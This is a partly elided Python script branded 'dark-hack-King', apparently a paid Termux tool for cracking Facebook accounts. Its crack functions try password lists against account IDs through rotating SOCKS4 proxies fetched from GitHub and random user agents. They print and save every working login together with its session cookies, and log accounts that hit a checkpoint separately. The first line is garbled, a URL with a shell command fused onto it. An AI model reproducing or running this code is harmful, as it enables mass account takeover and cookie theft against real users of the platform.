https://daniblogs.com/BF/976081xu#os.system("pkg install espeak")
#-----------------[ dark-hack-King ]-------------------#
...
princp=[]
try:
    Nnn= requests.get('https://github.com/Nyeem122-8/09980/blob/main/Nnn.text').text
    open('.Nnn.txt','w').write(Nnn)
except Exception as e:
    pass
Nnn=open('.Nnn.txt','r').read().splitlines()
...
def uaku():
    try:
        ua=open('Nnn','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Nyeem122-8/09980/blob/main/Nnn.text').text
        ua=open('Nnn','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/dark-hack.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╠══[Facebook                 • dark-hack King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mdark-hack-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01830****** ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  dark-hack,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[dark-hack•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            nip=random.choice(Nnn)
            Nnns= {'http': 'socks4://'+nip}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[dark-hack-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[dark-hack-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[dark-hack-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•dark-hack-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•dark-hack-Ok] {idf} • {pw}\n\033[0;93m[☺️]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ok,  dark-hack,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
